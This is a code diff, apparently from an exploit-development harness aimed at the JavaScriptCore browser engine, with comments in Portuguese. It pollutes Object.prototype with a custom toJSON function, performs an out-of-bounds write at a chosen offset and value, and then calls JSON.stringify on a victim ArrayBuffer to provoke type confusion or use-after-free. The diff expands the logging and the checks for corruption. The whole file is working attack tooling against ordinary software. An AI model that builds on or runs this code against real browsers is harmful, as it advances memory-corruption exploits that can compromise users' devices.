@@ -8,6 +8,7 @@ import {
 import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';
 
 let callCount_toJSON_tc = 0; // Contador global para o toJSON deste módulo
+const DETAILED_LOG_CALL_COUNT_THRESHOLD = 100; // Log detalhado para as primeiras N chamadas
 
 async function executeSingleJsonTCTest(
     description,
@@ -21,7 +22,7 @@ async function executeSingleJsonTCTest(
     const FNAME_SINGLE_TEST = `executeSingleJsonTCTest<${description}>`;
     logFn(`--- Iniciando Teste Especulativo: ${description} ---`, "test", FNAME_SINGLE_TEST);
     logFn(`   Offset Corrupção: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)}, PP: ${enable_pp}, Escrita OOB: ${attemptOOBWrite}, Setup OOB: ${!skipOOBEnvironmentSetup}`, "info", FNAME_SINGLE_TEST);
-    logFn(`   toJSON usará lógica SIMPLES (Object.keys) SEM controle de profundidade para retorno modificado.`, "info", FNAME_SINGLE_TEST);
+    logFn(`   toJSON usará lógica SIMPLES (Object.keys) com logging DETALHADO para as primeiras ${DETAILED_LOG_CALL_COUNT_THRESHOLD} chamadas.`, "info", FNAME_SINGLE_TEST);
 
     callCount_toJSON_tc = 0; // Reseta o contador para cada teste
 
@@ -49,36 +50,61 @@ async function executeSingleJsonTCTest(
         if (enable_pp) {
             logFn(`Tentando poluir Object.prototype.${ppKey}...`, "info", FNAME_SINGLE_TEST);
             Object.defineProperty(Object.prototype, ppKey, {
-                value: function() { // Lógica SIMPLES para toJSON
+                value: function() { // Lógica SIMPLES para toJSON, com logging detalhado no início
                     callCount_toJSON_tc++;
-                    const currentOperationThis = this;
-                    const logPrefixToJSON = `toJSON_TC_Simple(Call ${callCount_toJSON_tc}, Test: ${description})`;
+                    const currentOperationThis = this; // Captura 'this' no início da função
+                    const logPrefixToJSON = `toJSON_TC_Simple_DetailLog(Call ${callCount_toJSON_tc}, Test: ${description})`;
                     
-                    if (callCount_toJSON_tc < 20 || callCount_toJSON_tc % 500 === 0) { // Log menos frequente
+                    if (callCount_toJSON_tc <= DETAILED_LOG_CALL_COUNT_THRESHOLD) {
                         logFn(`[[[ ${logPrefixToJSON} INVOCADO ]]]`, 'vuln', FNAME_SINGLE_TEST);
                         try {
-                             logFn(`    typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, 'info', FNAME_SINGLE_TEST);
-                        } catch(e){}
+                            const typeOfThis = typeof currentOperationThis;
+                            const constructorName = currentOperationThis?.constructor?.name || 'N/A';
+                            logFn(`    ${logPrefixToJSON} typeof this: ${typeOfThis}, constructor: ${constructorName}`, 'info', FNAME_SINGLE_TEST);
+
+                            if (currentOperationThis === null || currentOperationThis === undefined) {
+                                logFn(`    ${logPrefixToJSON} 'this' é NULL ou UNDEFINED! Potencial corrupção.`, 'critical', FNAME_SINGLE_TEST);
+                                testSucceededSpeculatively = true;
+                                return { toJSON_this_is_null_or_undefined_tc: true, call_count_tc: callCount_toJSON_tc };
+                            }
+                            if (!(currentOperationThis instanceof Object) && typeof currentOperationThis !== 'function' /* Funções são objetos */) {
+                                logFn(`    ${logPrefixToJSON} 'this' NÃO é um objeto (Tipo: ${typeOfThis})! Potencial corrupção.`, 'critical', FNAME_SINGLE_TEST);
+                                testSucceededSpeculatively = true;
+                                return { toJSON_this_not_object_tc: true, call_count_tc: callCount_toJSON_tc, type_of_this: typeOfThis };
+                            }
+
+                            if (currentOperationThis instanceof ArrayBuffer) {
+                                logFn(`    ${logPrefixToJSON} 'this' é ArrayBuffer. byteLength: ${currentOperationThis.byteLength}`, 'info', FNAME_SINGLE_TEST);
+                            } else if (currentOperationThis && currentOperationThis.hasOwnProperty('keys_tc_simple')) {
+                                logFn(`    ${logPrefixToJSON} 'this' é nosso objeto retornado. #keys_tc_simple: ${currentOperationThis.keys_tc_simple?.length}`, 'info', FNAME_SINGLE_TEST);
+                            } else if (Array.isArray(currentOperationThis)) {
+                                logFn(`    ${logPrefixToJSON} 'this' é Array. length: ${currentOperationThis.length}`, 'info', FNAME_SINGLE_TEST);
+                            } else {
+                                logFn(`    ${logPrefixToJSON} 'this' é outro tipo de objeto.`, 'info', FNAME_SINGLE_TEST);
+                            }
+                            // Tente acessar uma propriedade que deveria existir ou que poderia falhar se 'this' estiver corrompido
+                            // Exemplo: se this deveria ser um objeto com 'byteLength'
+                             if (currentOperationThis.byteLength === undefined && Object.prototype.hasOwnProperty.call(currentOperationThis, 'byteLength')) {
+                                logFn(`    ${logPrefixToJSON} 'this' TEM 'byteLength' mas é UNDEFINED! Estranho.`, 'warn', FNAME_SINGLE_TEST);
+                             }
+
+                        } catch (e_prop_access) {
+                            logFn(`    ${logPrefixToJSON} ERRO FATAL ao acessar props de 'this': ${e_prop_access.message}. SUCESSO ESPECULATIVO!`, 'critical', FNAME_SINGLE_TEST);
+                            testSucceededSpeculatively = true;
+                            return { toJSON_prop_access_error_tc: true, call_count_tc: callCount_toJSON_tc, error_message: e_prop_access.message };
+                        }
+                    } else if (callCount_toJSON_tc % 500 === 0) { // Log menos frequente depois
+                        logFn(`[[[ ${logPrefixToJSON} INVOCADO (chamada ${callCount_toJSON_tc}) ]]]`, 'vuln', FNAME_SINGLE_TEST);
                     }
                     
                     try {
-                        // Tentativa de acessar 'this' para ver se ele está corrompido
-                        if (this && !(this instanceof Object)) { // Se não for mais um objeto
-                             logFn(`[[[ ${logPrefixToJSON} 'this' não é um objeto! Tipo: ${typeof this}. Potencial corrupção ANTES de Object.keys. ]]]`, 'critical', FNAME_SINGLE_TEST);
-                             testSucceededSpeculatively = true;
-                             // Retorna um erro para ser pego pelo stringifyResult ou pelo catch externo
-                             return { toJSON_this_corrupted_early_tc: true, call_count_tc: callCount_toJSON_tc, type_of_this: typeof this };
-                        }
-                        // Se this for null ou undefined Object.keys vai dar throw, o que é bom para o teste
                         const keys = Object.keys(this); 
-                        if (callCount_toJSON_tc < 5 || callCount_toJSON_tc % 1000 === 0) { // Log menos frequente
+                        if (callCount_toJSON_tc <= DETAILED_LOG_CALL_COUNT_THRESHOLD || callCount_toJSON_tc % 1000 === 0) {
                            logFn(`[[[ ${logPrefixToJSON} Object.keys OK. Retornando estrutura com chaves. #Keys: ${keys.length} ]]]`, 'info', FNAME_SINGLE_TEST);
                         }
-                        // Esta é a estrutura que, sem controle, pode levar ao estouro de pilha.
-                        // O objetivo é ver se a escrita OOB causa um crash ANTES disso.
                         return { toJSON_executed_tc_simple: true, keys_tc_simple: keys, call_count_tc_simple: callCount_toJSON_tc };
                     } catch (e_keys) {
-                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this) ou acesso a 'this': ${e_keys.message} ]]]`, 'critical', FNAME_SINGLE_TEST);
+                        logFn(`[[[ ${logPrefixToJSON} ERRO em Object.keys(this): ${e_keys.message}. SUCESSO ESPECULATIVO! ]]]`, 'critical', FNAME_SINGLE_TEST);
                         testSucceededSpeculatively = true; 
                         return { toJSON_error_tc_simple: true, message_tc_simple: e_keys.message, call_count_tc_simple: callCount_toJSON_tc };
                     }
@@ -86,7 +112,7 @@ async function executeSingleJsonTCTest(
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logFn(`Object.prototype.${ppKey} poluído com lógica SIMPLES.`, "good", FNAME_SINGLE_TEST);
+            logFn(`Object.prototype.${ppKey} poluído com lógica SIMPLES (logging detalhado inicial).`, "good", FNAME_SINGLE_TEST);
         } else {
             logFn(`Poluição de Object.prototype.${ppKey} DESABILITADA.`, "info", FNAME_SINGLE_TEST);
         }
@@ -111,9 +137,14 @@ async function executeSingleJsonTCTest(
             stringifyResult = JSON.stringify(victim_ab);
             logFn(`<<< RETORNO JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME_SINGLE_TEST);
              if (stringifyResult && typeof stringifyResult === 'string') {
-                if (stringifyResult.includes("toJSON_error_tc_simple:true") || stringifyResult.includes("toJSON_this_corrupted_early_tc:true") ) {
+                if (stringifyResult.includes("toJSON_error_tc_simple:true") || 
+                    stringifyResult.includes("toJSON_this_corrupted_early_tc:true") ||
+                    stringifyResult.includes("toJSON_this_not_object_tc:true") ||
+                    stringifyResult.includes("toJSON_prop_access_error_tc:true") ||
+                    stringifyResult.includes("toJSON_this_is_null_or_undefined_tc:true") 
+                    ) {
                     logFn("SUCESSO ESPECULATIVO (TC): Erro/Corrupção detectado DENTRO do toJSON poluído (lógica simples).", "vuln", FNAME_SINGLE_TEST);
-                    testSucceededSpeculatively = true;
+                    // testSucceededSpeculatively já deve ter sido setado dentro do toJSON
                 } else if (stringifyResult.includes("toJSON_executed_tc_simple:true")) {
                     logFn("JSON.stringify executou toJSON poluído (lógica simples) sem erro interno aparente. Verifique se houve estouro de pilha (RangeError) não capturado.", "good", FNAME_SINGLE_TEST);
                 }
@@ -122,7 +153,7 @@ async function executeSingleJsonTCTest(
             logFn(`ERRO CRÍTICO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME_SINGLE_TEST);
             logFn(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (Teste: ${description}, Offset: ${toHex(corruption_offset)}, Valor: ${toHex(value_to_write)})`, "vuln", FNAME_SINGLE_TEST);
             console.error(`JSON.stringify UAF/TC Test Error (${description}):`, e);
-            if (e.name === 'RangeError') { // Especificamente se for o estouro de pilha
+            if (e.name === 'RangeError') {
                 logFn("DETECTADO RangeError (Estouro de Pilha) durante JSON.stringify!", "error", FNAME_SINGLE_TEST);
             }
             testSucceededSpeculatively = true;
@@ -155,13 +186,12 @@ export async function runSpecificJsonTypeConfusionTest(description, corruptionOf
 // Função original, pode ser usada para varredura mais ampla se necessário
 export async function testJsonTypeConfusionUAFSpeculative() {
     logS3("Executando testJsonTypeConfusionUAFSpeculative (chamada de varredura original) - use runSpecificJsonTypeConfusionTest para testes direcionados.", "warn");
-    // Exemplo para chamar o teste com a configuração que antes travava, agora com toJSON SIMPLES
     await runSpecificJsonTypeConfusionTest(
-        "AttemptRecreateOriginalCrash_SimpleToJSONLogic",
-        0x70,       // corruptionOffset
-        0xFFFFFFFF, // valueToWrite
-        true,       // enablePP
-        true,       // attemptOOBWrite
-        false       // skipOOBEnvironmentSetup
+        "OriginalScenario_SimpleToJSON_DetailedLog",
+        0x70,
+        0xFFFFFFFF,
+        true,
+        true,
+        false
     );
 }
